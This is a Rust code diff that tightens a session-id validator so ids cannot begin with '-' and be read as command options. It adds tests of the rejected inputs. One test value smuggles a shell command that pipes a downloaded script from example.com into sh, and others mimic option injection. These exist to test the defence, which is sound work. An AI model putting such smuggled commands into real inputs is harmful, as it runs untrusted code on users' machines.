@@ -370,10 +370,11 @@ pub fn powershell(text: &str) -> String {
     quoted
 }
 
-/// A session id as Claude writes them: letters, digits and `-`, not too long.
+/// A session id as Claude writes them: letters, digits and `-`, not too long, and not
+/// starting with `-` (after `claude --resume` it would be an option).
 pub fn valid_id(id: &str) -> bool {
-    !id.is_empty()
-        && id.len() <= ID_LIMIT
+    id.len() <= ID_LIMIT
+        && id.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
         && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
 }
 
@@ -1549,7 +1550,18 @@ not json
     #[test]
     fn ids_and_folder_names() {
         assert!(valid_id("57a46179-c9ac-4bbb-82f1-abc8160adf58"));
-        for id in ["", "../x", "a b", "a/b", &"a".repeat(ID_LIMIT + 1)] {
+        let shell = "x; curl example.com | sh; #";
+        let long = "a".repeat(ID_LIMIT + 1);
+        for id in [
+            "",
+            "../x",
+            "a b",
+            "a/b",
+            "-x",
+            "--fork-session",
+            shell,
+            &long,
+        ] {
             assert!(!valid_id(id), "{id:?}");
         }
         assert!(valid_id(&"a".repeat(ID_LIMIT)));
